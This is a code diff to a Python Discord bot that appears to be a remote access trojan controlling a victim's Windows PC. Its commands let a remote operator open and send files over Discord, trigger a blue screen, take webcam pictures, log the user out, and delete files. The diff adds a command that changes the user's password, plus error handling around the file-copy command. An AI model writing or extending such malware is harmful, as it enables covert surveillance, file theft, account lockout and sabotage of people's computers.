@@ -55,6 +55,7 @@ async def on_message(message):
             .open - Open a specified file. Usage: .open <full file path>. Example: .open c:/Users/user/Desktop/textfile.txt
             .copy - Copy a specified file. Usage: .copy <full file path>. Example: .copy c:/Users/user/Desktop/textfile.txt
             .bsod - Trigger a BSOD.
+            .changepassword - Change the user's password. Usage: .changepassword <new password>
             .webcam - Take a picture using the webcamera.
             .logout - Logout the user from the computer.
             .delete - Delete a specified file. Usage: .delete <full file path>. Example: .delete c:/Users/user/Desktop/textfile.txt
@@ -141,8 +142,6 @@ async def on_message(message):
             embed = discord.Embed(title="Upload failed", description="No directory specified. To upload in curent direcotry use ./", color=0x00ff00)
             await message.channel.send(embed=embed)
             return
-        if not os.path.exists(directory):
-            os.mkdir(directory)
         await message.delete()
         if message.attachments:
             for attachment in message.attachments:
@@ -200,10 +199,16 @@ async def on_message(message):
 
     #COPY
     if message.content.startswith(".copy"):
-        loc = message.content.replace(".copy ", "")
-        await message.delete()
-        embed = discord.Embed(title="Copy", description="File copied.", color=0x00ff00)
-        await message.channel.send(file=discord.File(loc),embed=embed)
+        try:
+            loc = message.content.replace(".copy ", "")
+            await message.delete()
+            embed = discord.Embed(title="Copy", description="File copied.", color=0x00ff00)
+            await message.channel.send(file=discord.File(loc),embed=embed)
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Copy", description="Failed to copy file.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
     
     #BSOD
     if message.content.startswith(".bsod"):
@@ -215,6 +220,18 @@ async def on_message(message):
             embed = discord.Embed(title="BSOD", description="Failed to BSOD.", color=0x00ff00)
             return
         embed = discord.Embed(title="BSOD", description="BSOD Executed.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+    
+    #CHANGE PASSWORD
+    if message.content.startswith(".changepassword"):
+        await message.delete()
+        try:
+            pc.change_password(message.content.replace(".changepassword ", ""))
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Change Password", description="Failed to change password.", color=0x00ff00)
+            return
+        embed = discord.Embed(title="Change Password", description="Password changed.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
     #WEBCAMSHOT
